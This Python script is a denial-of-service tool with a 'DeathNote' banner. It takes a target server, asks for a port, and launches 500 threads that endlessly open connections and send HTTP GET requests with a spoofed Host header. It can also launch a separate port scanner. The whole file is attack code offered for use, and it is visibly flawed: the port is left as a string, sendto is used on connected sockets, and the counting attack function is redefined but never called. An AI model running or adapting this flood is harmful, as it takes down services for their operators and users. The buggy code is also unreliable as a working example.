import time
import random
import argparse 
import os
import socket
import struct
import threading
#lib to install : argparse


#printing logo
print("""\

  ___           _   _    _  _     _       
 |   \ ___ __ _| |_| |_ | \| |___| |_ ___ 
 | |) / -_) _` |  _| ' \| .` / _ \  _/ -_)
 |___/\___\__,_|\__|_||_|_|\_\___/\__\___|
                                          
""")

print("--[made by PS]--")
print ("Use -h to see the options")

#ddos tool 
def death_note():
    target = args.server
    port = input("[+]Port for attacking : ")
    fake_ip = '192.168.0.1'
    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
    attack_num = 0
    
    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            
            global attack_num
            attack_num += 1
            print(attack_num)
            
            s.close()
    


    

#starting input !``

parser = argparse.ArgumentParser()
parser.add_argument("--server", action="store",  help="attack to server ip -s ip") 
parser.add_argument("--port_scanner", help="Add a port scanner to do a quick scan", action = "store_true")
args = parser.parse_args()
    
if args.server :
    print("[--target--]: " + args.server)
    
    death_note()
if args.port_scanner :
    os.system("python3 port_scanner.py ")



